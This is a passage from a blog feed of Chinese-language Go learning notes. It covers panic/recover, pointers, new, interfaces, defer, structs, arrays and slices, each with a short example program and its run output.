class="line">fmt.Println(<span class="string">"I am working"</span>)</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"i will down?"</span>)</span><br><span class="line">msg := <span class="built_in">recover</span>()</span><br><span class="line">fmt.Println(msg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run panic_recover.go</span><br><span class="line">I am working</span><br><span class="line">panic: i will down?</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        D:/go_sty/day5/panic_recover.go:7 +0x80</span><br><span class="line">exit status 2</span><br></pre></td></tr></table></figure></div><h2 id="指针回顾"><a href="#指针回顾" class="headerlink" title="指针回顾"></a>指针回顾</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp; 取一个变量的地址</span><br><span class="line">*   去一个指针变量所指向的地址值</span><br><span class="line">指针的一大用途就是可以将变量的指针作为实参传递给函数，</span><br><span class="line">从而在函数内部能够直接修改实参所指向的变量值。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span>  main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">change</span><span class="params">(x <span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">x = <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="keyword">int</span> = <span class="number">100</span></span><br><span class="line">fmt.Println(x)</span><br><span class="line">change(x)</span><br><span class="line">fmt.Println(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run point.go</span><br><span class="line">100</span><br><span class="line">100</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change函数改变的仅仅是内部变量x的值，而不会改变传递进去的实参。</span><br><span class="line">其实，也就是说Go的函数一般关心的是输出结果，而输入参数就相当于信使跑到函数门口大叫，</span><br><span class="line">你们这个参数是什么值，那个是什么值，然后就跑了。你函数根本就不能修改它的值。</span><br><span class="line">不过如果是传递的实参是指针变量，那么函数一看，小子这次你地址我都知道了，哪里跑。</span><br><span class="line">那么就是下面的例子：</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span>  main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">change</span><span class="params">(x *<span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">*x = <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="keyword">int</span> = <span class="number">100</span></span><br><span class="line">fmt.Println(x)</span><br><span class="line">change(&amp;x)</span><br><span class="line">fmt.Println(x)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上面的例子中，change函数的虚参为整型指针变量，所以在main中调用的时候传递的是x的地址。</span><br><span class="line">然后在change里面使用*x=200修改了这个x的地址的值。所以x的值就变了。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run point_1.go</span><br><span class="line">100</span><br><span class="line">200</span><br></pre></td></tr></table></figure></div><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new这个函数挺神奇，因为它的用处太多了。这里还可以通过new来初始化一个指针。上面说过指针指向(存储)的是一个变量的地址，但是指针本身也需要地址存储。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">set_value</span><span class="params">(x *<span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">*x = <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">x := <span class="built_in">new</span>(<span class="keyword">int</span>)</span><br><span class="line">set_value(x)</span><br><span class="line">fmt.Println(x)</span><br><span class="line">fmt.Println(&amp;x)</span><br><span class="line">fmt.Println(*x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run new.go</span><br><span class="line">0xc00004a058</span><br><span class="line">0xc000072018</span><br><span class="line">200</span><br></pre></td></tr></table></figure></div><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Go语言提供了一种接口功能，它把所有的具有共性的方法定义在一起，</span><br><span class="line">任何其他类型只要实现了这些方法就是实现了这个接口，</span><br><span class="line">不一定非要显式地声明要去实现哪些接口啦。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Phone <span class="keyword">interface</span> &#123;</span><br><span class="line">call()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> NokiaPhone <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(nokiaphone NokiaPhone)</span> <span class="title">call</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"I am NokiaPhone"</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IPhone <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(iphone IPhone)</span> <span class="title">call</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"I am IPhone"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> phone Phone</span><br><span class="line"></span><br><span class="line">phone  =  <span class="built_in">new</span>(NokiaPhone)</span><br><span class="line">phone.call()</span><br><span class="line"></span><br><span class="line">phone = <span class="built_in">new</span>(IPhone)</span><br><span class="line">phone.call()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day5&gt;go run interface.go</span><br><span class="line">I am NokiaPhone</span><br><span class="line">I am IPhone</span><br></pre></td></tr></table></figure></div><h2 id="并行计算"><a href="#并行计算" class="headerlink" title="并行计算"></a>并行计算</h2>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day2</title>
      <link href="/2018/09/12/golang-day2/"/>
      <url>/2018/09/12/golang-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="Golang-Day2"><a href="#Golang-Day2" class="headerlink" title="Golang_Day2"></a>Golang_Day2</h1><h2 id="defer-栈"><a href="#defer-栈" class="headerlink" title="defer 栈"></a>defer 栈</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(<span class="string">"FUN"</span>)</span><br><span class="line"><span class="keyword">for</span> i :=<span class="number">0</span>; i&lt;<span class="number">10</span> ;i++ &#123;</span><br><span class="line"><span class="keyword">defer</span>  fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">"done"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day2&gt;go run defer_multi.go</span><br><span class="line">FUN</span><br><span class="line">done</span><br><span class="line">9</span><br><span class="line">8</span><br><span class="line">7</span><br><span class="line">6</span><br><span class="line">5</span><br><span class="line">4</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">0</span><br></pre></td></tr></table></figure></div><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指针保存了变量的内存地址</span><br><span class="line">类型*T 是指向类型T的值得指针。其零值是“nil”</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">i,j := <span class="number">42</span>,<span class="number">27</span></span><br><span class="line"></span><br><span class="line">p := &amp;i             </span><br><span class="line">fmt.Println(*p)</span><br><span class="line">*p = <span class="number">31</span></span><br><span class="line">fmt.Println(i)</span><br><span class="line"></span><br><span class="line">p = &amp;j</span><br><span class="line">*p = *p/<span class="number">5</span></span><br><span class="line">fmt.Println(j)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day3</title>
      <link href="/2018/09/12/golang-day3/"/>
      <url>/2018/09/12/golang-day3/</url>
      
        <content type="html"><![CDATA[<h1 id="Golang-Day3"><a href="#Golang-Day3" class="headerlink" title="Golang_Day3"></a>Golang_Day3</h1><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个结构体（`struct`）就是一个字段的集合。</span><br><span class="line">（而 type 的含义跟其字面意思相符。）</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">x <span class="keyword">int</span></span><br><span class="line">y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(test&#123;<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run struct.go</span><br><span class="line">&#123;2 3&#125;</span><br></pre></td></tr></table></figure></div><h2 id="结构体字段"><a href="#结构体字段" class="headerlink" title="结构体字段"></a>结构体字段</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结构体字段利用点来访问</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test1 <span class="keyword">struct</span> &#123;</span><br><span class="line">x <span class="keyword">int</span></span><br><span class="line">y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">v := test1&#123;<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">v.x =  <span class="number">10</span></span><br><span class="line">fmt.Println(v.x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run struct_fields.go</span><br><span class="line">10</span><br></pre></td></tr></table></figure></div><h2 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">结构体字段可以通过结构体指针来访问。</span><br><span class="line">通过指针间接访问是透明的。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test2 <span class="keyword">struct</span> &#123;</span><br><span class="line">x <span class="keyword">int</span></span><br><span class="line">y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">v := test2&#123;<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">p := &amp;v</span><br><span class="line">p.x = <span class="number">9</span></span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run struct_pointers.go</span><br><span class="line">&#123;9 3&#125;</span><br></pre></td></tr></table></figure></div><h2 id="结构体文法"><a href="#结构体文法" class="headerlink" title="结构体文法"></a>结构体文法</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">结构体文法表示通过结构体字段的值作为列表来新分配一个结构体。</span><br><span class="line">使用 Name: 语法可以仅列出部分字段。（字段名的顺序无关。）</span><br><span class="line">特殊的前缀 &amp; 返回一个指向结构体的指针</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test3 <span class="keyword">struct</span> &#123;</span><br><span class="line">x,y <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">v1 = test3&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">v2 = test3&#123;x:<span class="number">3</span>&#125;</span><br><span class="line">v3 = test3&#123;y:<span class="number">4</span>&#125;</span><br><span class="line">p = &amp;test3&#123;<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(v1,v2,v3,p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run struct_literals.go</span><br><span class="line">&#123;1 2&#125; &#123;3 0&#125; &#123;0 4&#125; &amp;&#123;5 6&#125;</span><br></pre></td></tr></table></figure></div><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型[n]t,有n个类型为t的值数组。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a [10]int</span><br><span class="line">定义变量a是有十个整数的数组</span><br><span class="line">数组的长度是其类型的一部分，因此数组不能改变大小。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> a [<span class="number">2</span>]<span class="keyword">string</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="string">"Hello"</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="string">"World"</span></span><br><span class="line">fmt.Println(a[<span class="number">0</span>],a[<span class="number">1</span>])</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run array.go</span><br><span class="line">Hello World</span><br><span class="line">[Hello World]</span><br></pre></td></tr></table></figure></div><h2 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个 slice 会指向一个序列的值，并且包含了长度信息。</span><br><span class="line">[]T 是一个元素类型为 T 的 slice。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">p := []<span class="keyword">int</span>&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span 